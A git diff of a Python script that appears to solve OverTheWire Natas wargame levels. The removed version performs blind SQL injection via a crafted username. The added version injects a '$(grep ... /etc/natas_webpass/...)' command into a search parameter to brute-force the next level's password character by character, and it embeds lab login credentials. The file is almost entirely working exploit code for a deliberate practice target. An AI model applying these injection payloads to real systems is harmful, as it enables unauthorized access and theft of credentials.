@@ -1,11 +1,11 @@
 import requests
 import string
 import base64
-import itertools
 
 def build_password():
     letters = string.printable
-    tmp = "a"
+    # an entry point found by sending ad-hoc requests
+    tmp = "A"
 
     while(len(tmp) < 32):
         for letter in letters:
@@ -20,10 +20,11 @@ def build_password():
     return tmp
 
 def is_subpassword(suggestion):
-    auth_key = "Basic " + base64.b64encode(b"natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J").decode("utf-8")
-    result = requests.post("http://natas15.natas.labs.overthewire.org/index.php", 
+    auth_key = "Basic " + base64.b64encode(b"natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh").decode("utf-8")
+    result = requests.post("http://natas16.natas.labs.overthewire.org/index.php", 
                             headers={"Authorization": auth_key}, 
-                            data={"username": "natas16\" and password like \"%" + suggestion + "%\" COLLATE latin1_general_cs or \""})
-    return suggestion not in string.punctuation and "This user exists." in result.text
+                            params={"submit": "Search", "needle": "sonatas$(grep " + suggestion + " /etc/natas_webpass/natas17)"})
+    #print(result.text)
+    return suggestion not in string.punctuation and "<pre>\n</pre>" in result.text
 
 print(build_password())
